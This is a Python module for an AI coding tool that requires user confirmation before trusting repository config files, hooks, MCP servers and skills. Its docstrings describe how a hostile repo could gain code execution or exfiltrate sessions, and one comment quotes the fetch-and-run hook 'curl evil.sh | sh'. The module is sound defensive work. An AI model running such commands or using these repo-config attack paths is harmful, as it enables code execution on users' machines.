"""First-use trust confirmation for repository-level config files.

SECURITY (2026-08-14 v2 audit, biggest remaining hole): the loader placed the
REPOSITORY's ``.coderio/config.toml`` ABOVE the user config — a cloned malicious
repo could set ``permission_mode = "full"``, point ``model.base_url`` at an
attacker's endpoint (session exfiltration), and ``.mcp.json``'s ``command``
entries are spawned directly at startup. Cloning a hostile repo + starting
coderio ≈ arbitrary code execution, with zero prompt.

Mitigation (same approach as Claude Code / Codex / ZCode): on first detection
of repo-level config, SHOW the user what it contains and require explicit
confirmation. The confirmation is recorded per-repo in the USER's trust store
(``~/.coderio/trusted-repos.json``), keyed by a content hash — a later commit
that changes the config re-triggers the prompt (trust the content, not just
the path).

DISCOVERY SCOPE (2026-08-14 v3 audit P0): trust judgment must cover AT LEAST
what actually gets loaded. config.toml is discovered by the loader's upward
walk (``_find_project_dir``); ``.mcp.json`` by mcp_loader's OWN independent
upward walk (``_find_mcp_config``). The original gate checked only one
directory, so a repo whose root had ONLY ``.mcp.json`` + launching from a
subdirectory bypassed the gate while the server still loaded. This module now
performs the same per-file upward discovery the loaders do.
"""

from __future__ import annotations

import hashlib
import json
import logging
import tomllib
from pathlib import Path

_log = logging.getLogger(__name__)

# Safety-relevant keys called out in the confirmation summary — the user should
# see these even if they don't read the full file. Includes hook command keys:
# hooks are the repo's most direct RCE surface (v3 audit P1 — the summary
# previously showed only "config.toml (76 bytes)" while a hook ran
# "curl evil.sh | sh"; that was a blind signature).
_SENSITIVE_KEYS = (
    "permission_mode",
    "sandbox_mode",
    "base_url",
    "auto_allow_if_sandboxed",
    "network_allowed",
    "command",
    "hooks",
    "args",
    "env",
)


def _trust_store(user_dir: Path | str) -> Path:
    return Path(user_dir) / "trusted-repos.json"


def discover_repo_configs(search_from: Path | str) -> tuple[Path, list[Path]]:
    """Discover repo config files the SAME way the loaders do.

    Returns (repo_root, configs):
      - config.toml via the config loader's upward walk (``_find_project_dir``,
        which stops at the user's home),
      - ``.mcp.json`` via mcp_loader's independent upward walk
        (``_find_mcp_config``),
      - ``.coderio/skills/`` directory (v3 audit #8: project-layer skills enter
        the system prompt on load and may carry ``tools.py`` that is exec'd on
        activation — a repo shipping ONLY skills previously loaded with zero
        confirmation).

    Trust scope ⊇ load scope: whatever the loaders will find and apply, this
    finds too.
    """
    from coderio.config.loader import _find_project_dir
    from coderio.mcp_loader import _find_mcp_config

    search_from = Path(search_from).resolve()
    configs: list[Path] = []

    proj = _find_project_dir(search_from)
    config_toml = proj / ".coderio" / "config.toml"
    if config_toml.is_file():
        configs.append(config_toml)

    mcp = _find_mcp_config(search_from)
    if mcp is not None:
        configs.append(mcp)

    # Project-layer skills: loaded by repl.build_runtime from the config
    # loader's project dir — same anchor, same discovery.
    skills_dir = proj / ".coderio" / "skills"
    if skills_dir.is_dir() and any(skills_dir.iterdir()):
        configs.append(skills_dir)

    # Store key root: the config.toml dir when present (the loader's anchor),
    # else the .mcp.json dir. Same launch point ⇒ same discovered set ⇒ same key.
    if config_toml.is_file():
        root = proj
    elif mcp is not None:
        root = mcp.parent
    else:
        root = search_from
    return root, configs


def _repo_fingerprint(configs: list[Path]) -> str:
    """Hash the CONTENT of every discovered repo config file/dir.

    Content-keyed trust: editing the config after confirmation re-triggers the
    prompt — a malicious upstream commit can't ride on a previously-granted
    trust. Directories (the skills layer) hash every contained file's
    relpath + content, sorted for determinism.
    """
    h = hashlib.sha256()
    for p in configs:
        h.update(str(p).encode("utf-8"))
        if p.is_dir():
            for f in sorted(p.rglob("*")):
                if f.is_file():
                    h.update(f.relative_to(p).as_posix().encode("utf-8"))
                    h.update(f.read_bytes())
        else:
            h.update(p.read_bytes())
    return h.hexdigest()


def existing_repo_configs(search_from: Path | str) -> list[Path]:
    """Return the repo-level config files discoverable from this launch point."""
    _, configs = discover_repo_configs(search_from)
    return configs


def is_repo_trusted(search_from: Path | str, user_dir: Path | str) -> bool:
    """True when the discovered repo config content matches a stored trust entry.

    A launch point with no discovered repo-level config is trusted by
    definition (nothing to confirm). A config change after confirmation
    invalidates the trust.
    """
    root, configs = discover_repo_configs(search_from)
    if not configs:
        return True
    store = _trust_store(user_dir)
    if not store.is_file():
        return False
    try:
        entries = json.loads(store.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return False
    if not isinstance(entries, dict):
        return False
    trusted = entries.get(str(root))
    return trusted == _repo_fingerprint(configs)


def mark_repo_trusted(search_from: Path | str, user_dir: Path | str) -> None:
    """Record the currently discovered repo config content as trusted (after
    the user confirms). Best-effort: a failure to write the store logs a
    warning and leaves the repo untrusted (safe direction — the prompt
    reappears)."""
    root, configs = discover_repo_configs(search_from)
    if not configs:
        return
    store = _trust_store(user_dir)
    entries: dict = {}
    if store.is_file():
        try:
            loaded = json.loads(store.read_text(encoding="utf-8"))
            if isinstance(loaded, dict):
                entries = loaded
            else:
                # v3 audit #9 + 2026-08-18 self-audit: a corrupt store (any
                # non-dict JSON — lists, strings, numbers, AND null; null
                # previously slipped through an `is not None` guard)
                # previously reset to {} and OVERWROTE every other repo's
                # trust entries. Skip the write entirely (the repo stays
                # untrusted; other entries can't be lost by us).
                _log.warning(
                    "trust store %s has unexpected shape (%s); leaving it untouched",
                    store,
                    type(loaded).__name__,
                )
                return
        except json.JSONDecodeError:
            _log.warning("trust store %s is corrupt; leaving it untouched (this repo stays untrusted)", store)
            return
    try:
        entries[str(root)] = _repo_fingerprint(configs)
        store.parent.mkdir(parents=True, exist_ok=True)
        store.write_text(json.dumps(entries, indent=2), encoding="utf-8")
        _restrict_store_permissions(store)
    except OSError as e:
        _log.warning("could not persist repo trust for %s: %s", root, e)


def _restrict_store_permissions(store: Path) -> None:
    """Tighten the trust store to owner-only (0600 / icacls), reusing the
    credentials module's cross-platform helper. The store maps repo paths to
    trust decisions — writable-by-others would let a local process
    pre-trust repos. Best-effort: failures log, never raise (v3 audit #9)."""
    try:
        from coderio.cli.credentials import _restrict_permissions

        _restrict_permissions(store)
    except Exception as e:  # noqa: BLE001 — hardening is best-effort
        _log.warning("could not restrict trust-store permissions: %s", e)


def summarize_repo_configs(search_from: Path | str) -> str:
    """Build the human-readable summary shown in the confirmation prompt.

    Lists each discovered file and its safety-relevant content — permission
    mode, base_url, HOOK COMMANDS, MCP server commands/args, and skill
    entries (with ⚠ on skills carrying tools.py — those execute code on
    activation) — so nothing dangerous hides behind a bare filename.
    """
    root, configs = discover_repo_configs(search_from)
    lines = []
    for path in configs:
        try:
            rel = path.relative_to(root).as_posix()
        except ValueError:
            rel = str(path)
        if path.is_dir():
            # Skills layer: list each skill; mark the ones that execute code.
            lines.append(f"{rel}/ (project skills)")
            for skill_dir in sorted(p for p in path.iterdir() if p.is_dir()):
                marker = " ⚠ executes code (tools.py)" if (skill_dir / "tools.py").is_file() else ""
                lines.append(f"  skill {skill_dir.name!r}{marker}")
            continue
        lines.append(f"{rel} ({path.stat().st_size} bytes)")
        try:
            text = path.read_text(encoding="utf-8")
        except OSError:
            lines.append("  <unreadable>")
            continue
        if path.name == "config.toml":
            # Parse TOML structurally so multi-line strings, inline tables, and
            # nested values can't hide hook commands (P2-1 regression test:
            # a multi-line `command = """\n...\n"""` was previously invisible
            # because only raw lines containing a sensitive key were echoed).
            try:
                with open(path, "rb") as _f:
                    data = tomllib.load(_f)
            except Exception:
                data = {}
            hooks = data.get("hooks", [])
            if hooks:
                lines.append("  [[hooks]]")
                for h in hooks:
                    h = h or {}
                    cmd = h.get("command")
                    if cmd:
                        lines.append(f"    command = {cmd!r}")
                    ev = h.get("event")
                    if ev:
                        lines.append(f"    event = {ev!r}")
            # Echo every line mentioning a sensitive key (non-hook keys).
            for ln in text.splitlines():
                s = ln.strip()
                if any(k in s for k in _SENSITIVE_KEYS) and "=" in s:
                    if not s.startswith("[[hooks]]") and not s.startswith("command =") and not s.startswith("event ="):
                        lines.append(f"  {s}")
        else:  # .mcp.json — list servers (they spawn/connect at startup)
            try:
                servers = json.loads(text).get("mcpServers", {})
                for name, cfg in servers.items():
                    cfg = cfg or {}
                    parts = [str(cfg.get(k)) for k in ("command", "url") if cfg.get(k)]
                    if cfg.get("args"):
                        parts.append(" ".join(str(a) for a in cfg["args"]))
                    if cfg.get("env"):
                        keys = ",".join(cfg["env"].keys())
                        parts.append(f"env:[{keys}]")
                    lines.append(f"  server {name!r}: {' '.join(parts) or '?'}")
            except json.JSONDecodeError:
                lines.append("  <invalid JSON>")
    return "\n".join(lines)
